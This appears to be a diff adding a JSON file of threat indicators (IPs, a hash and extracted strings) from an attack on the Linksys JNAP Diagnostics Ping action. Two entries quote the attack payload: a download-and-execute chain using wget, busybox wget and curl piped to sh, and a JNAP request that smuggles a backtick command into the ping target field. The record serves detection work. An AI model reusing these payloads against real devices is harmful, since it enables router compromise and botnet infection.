@@ -1,0 +1,45 @@
+[
+  {
+    "context": "Embedded IP in inbound payload",
+    "source": "static_analysis",
+    "type": "ip",
+    "value": "190.179.139.XXX"
+  },
+  {
+    "context": "Embedded IP in inbound payload",
+    "source": "static_analysis",
+    "type": "ip",
+    "value": "91.92.40.XXX"
+  },
+  {
+    "context": "Embedded URL in inbound payload",
+    "source": "strings",
+    "type": "url",
+    "value": "hxxp://91.92.40.XXX/wget.sh%20-O-%7Csh%20-s%20ljnap2%3Bbusybox%20wget%20http://91.92.40.XXX/wget.sh%20-O-%7Csh%20-s%20ljnap2%3Bcurl%20http://91.92.40.XXX/wget.sh%7Csh%20-s%20ljnap2"
+  },
+  {
+    "context": "Embedded URL in inbound payload",
+    "source": "strings",
+    "type": "url",
+    "value": "hxxp://linksys[.]com/jnap/network/Diagnostics"
+  },
+  {
+    "context": "Inbound payload hash (unknown)",
+    "source": "static_analysis",
+    "type": "hash",
+    "value": "cfef51591732203bfa9ba9b9994625e2fb47955640e8933913ea11027caece9c"
+  },
+  {
+    "context": "Suspicious command in inbound payload",
+    "source": "strings",
+    "type": "command",
+    "value": "{\"JNAP\":{\"action\":\"hxxp://linksys[.]com/jnap/network/Diagnostics\",\"command\":\"Ping\",\"target\":\"[internal-ip-redacted]%20`cd%20/tmp%3Bwget"
+  },
+  {
+    "asn": "TechTies Inc.",
+    "country": "The Netherlands",
+    "role": "artifact_source",
+    "type": "ip",
+    "value": "45.153.34.XXX"
+  }
+]
